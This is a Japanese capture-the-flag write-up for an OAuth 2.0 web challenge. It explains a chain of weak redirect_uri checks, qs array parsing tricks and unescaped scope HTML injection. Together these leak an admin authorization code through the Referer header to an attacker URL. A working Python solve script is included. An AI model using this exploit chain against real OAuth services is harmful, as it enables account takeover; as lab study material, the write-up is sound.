# writeup

OAuth2.0の詳細については[RFC 6749](https://www.rfc-editor.org/rfc/rfc6749)を参照。

`server`の実装を見ると、`redirect_uri`の検証部分が不適切であり、任意のクエリパラメータを含めることが可能。
```:.js
if (!client.redirect_uris.includes(redirectUrl.origin+redirectUrl.pathname)) {
    res.status(400).json({ error: "invalid_request", error_description: "invalid redirect_uri" });
    return;
}
```

`server`の`/approve`エンドポイントでは入力の`redirect_uri`にクエリパラメータとして認可コード`code`が追加され、そのURLにリダイレクトがなされる。
```:.js
redirectUrl.searchParams.append("code", code.value);
res.redirect(redirectUrl.href);
```

`server`では`app.use(bodyParser.urlencoded({ extended: true }));`が設定されており、`body`の解析に`qs`ライブラリが使用されるため、`body`として送信できるオブジェクトが柔軟に操作できる。また、`server`の`/token`エンドポイントでは`body`として送信される`code`の値が`Array`の場合に、最後の要素がアクセストークンの発行に使用され、削除される。

```:.js
const codeValue = Array.isArray(req.body.code)? req.body.code.slice(-1)[0] : req.body.code;
const code = codes.get(codeValue);
...
codes.delete(code.value);
```

そして、`server`のReport機能を用いると`server`の`/auth`エンドポイントにクエリパラメータを付与して送信することができ、リダイレクト先の同意画面にて`admin`のユーザー名とパスワードが入力され送信される。つまり、ここでは`admin`用に認可コードが発行され、アクセストークンとの交換に使用するために消費される。

```:.js
await page.goto(SERVER_URL + "/auth" + query, {
    waitUntil: "networkidle2",
    timeout: 3000, 
}); 
await page.waitForSelector("input[name=username]");
await page.type("input[name=username]", USERNAME);
await page.type("input[name=password]", PASSWORD);
await page.click("input[name=approved]");
```

ここで、`redirect_uri`のクエリパラメータとして`code`を送信することで、guest用に発行された認可コードを消費させ、admin用に発行された認可コードを消費させないことを試みる。この場合、通常は後からクエリパラメータに追加されるadmin用に発行された`code`が配列の最後の要素となる。

```
> qs.parse('code=guest-code&code=admin-code')
{ code: [ 'guest-code', 'admin-code' ] }
> qs.parse('code[2]=guest-code&code=admin-code')
{ code: [ 'guest-code', 'admin-code' ] }
```

しかし、以下のようにすると、guest用に発行された`code`を配列の最後の要素にすることができる。これでguest用に発行された認可コードを消費させ、admin用に発行された認可コードを消費させないことが可能となる。あとは、admin用に発行された認可コードを含むURLを窃取することが求められる。

```
> qs.parse('code[2]=guest-code&code=hoge&code=admin-code')
{ code: [ 'hoge', 'admin-code', 'guest-code' ] }
```

ここで`client`の`index.ejs`では`scope`の値の表示に`<%- %>`が使用されており、値がエスケープされずに表示される（[参考](https://github.com/mde/ejs#features)）。

```:.ejs
<% if(scopes) { %>
    <p>Your Permissions:</p>
    <ul>
        <% scopes.forEach(function(scope) { %>
            <li><%- scope %></li>
        <% }); %>
    </ul>
<% }; %>
```

CSPが設定されており、javascriptを用いてURLを窃取することは不可能であるが、HTMLインジェクションは可能である。

```:.js
app.use(function(req, res, next) {
  const nonce = crypto.randomBytes(8).toString("hex");
  req.nonce = nonce; 
  res.setHeader("Content-Security-Policy", `script-src 'nonce-${nonce}' https://maxcdn.bootstrapcdn.com https://ajax.googleapis.com; connect-src 'self'; base-uri 'self';`);
  return next();
});
```

また、`index.ejs`に`<meta name="referrer" content="no-referrer-when-downgrade">`が設定されており、このページから遷移した際のRefererリクエストヘッダにクエリパラメータを含むフルのURLが送信される（[参考](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Referrer-Policy)）。

最終的に以下のスクリプトを用いて生成したURLをReport機能で送信することで、admin用に発行された認可コードを得ることができる。

```:.py
import requests
import re
import os
import urllib

def solve():
    CLIENT_URL = os.environ["CLIENT_URL"]
    SERVER_URL = os.environ["SERVER_URL"]
    ATTACKER_URL = os.environ["ATTACKER_URL"]

    s = requests.Session()

    auth_params = {
        "response_type": "code",
        "client_id": "oauth-client",
        "state": "state",
        "scopes": f'<img/src="{ATTACKER_URL}">',
        "redirect_uri": f'{CLIENT_URL}/callback'
    }
    auth_response = s.get(f"{SERVER_URL}/auth", params=auth_params)

    approve_data = {
        "approved": "true",
        "username": "guest",
        "password": "guest"
    }
    approve_response = s.post(f"{SERVER_URL}/approve", data=approve_data, allow_redirects=False)
    match = re.search(r'code=([0-9a-f]{32})', approve_response.text)
    guest_code = match.group(1)

    query_param = {
        "response_type": "code",
        "client_id": "oauth-client",
        "state": "state",
        "scopes": "email profile",
        "redirect_uri": f"{CLIENT_URL}/callback?code[2]={guest_code}&code=hoge"
    }
    fishing_url = SERVER_URL + "/auth?" + urllib.parse.urlencode(query_param)
    print(fishing_url)

if __name__ == "__main__":
    solve()
```

あとは、admin用に発行された認可コードを使用してadmin用のアクセストークンを取得してflagを得る。

```:.py
callback_param = {
    "state": "state",
    "code": admin_code
}
callback_response = s.post(f"{CLIENT_URL}/callback", params=callback_params)
flag_response = s.get(f"{CLIENT_URL}/flag")
print(flag_response)
```

```
Congratulations! Here's your flag: ctf4b{J00_4re_7HE_vUlN_cH41n_m457eR_0F_04U7H}
```